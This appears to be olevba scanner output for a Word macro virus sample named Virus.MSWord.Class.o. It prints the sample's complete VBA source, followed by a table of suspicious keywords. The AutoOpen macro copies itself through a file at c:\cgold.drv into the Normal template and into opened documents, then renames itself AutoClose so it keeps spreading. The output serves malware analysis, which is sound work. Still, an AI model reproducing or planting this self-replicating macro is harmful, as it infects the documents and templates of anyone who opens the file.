olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.o
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.o - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If nt > 10 And ad > 0 Then End
If nt < 10 Then Set host = NormalTemplate.VBProject.VBComponents.Item(1)
If nt < 10 Then ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\cgold.drv"
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
host.CodeModule.AddFromFile ("c:\cgold.drv")
host.CodeModule.deletelines 1, 4
If nt < 10 Then host.CodeModule.replaceline 1, "Sub AutoClose()"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

